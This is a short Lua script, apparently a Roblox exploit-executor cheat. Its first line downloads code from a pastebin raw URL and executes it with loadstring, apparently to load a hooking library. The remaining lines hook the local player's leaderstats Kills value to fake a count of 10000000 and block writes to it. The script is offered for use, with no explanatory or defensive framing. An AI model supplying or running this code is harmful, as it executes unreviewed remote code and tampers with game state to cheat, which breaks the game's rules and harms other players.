if not getgenv().MTAPIMutex then loadstring(game:HttpGet("https://pastebin.com/raw/kVTWZvC9", true))() end

game:GetService("Players").LocalPlayer.leaderstats.Kills:AddGetHook("Value", 10000000)
game:GetService("Players").LocalPlayer.leaderstats.Kills:AddSetHook("Value")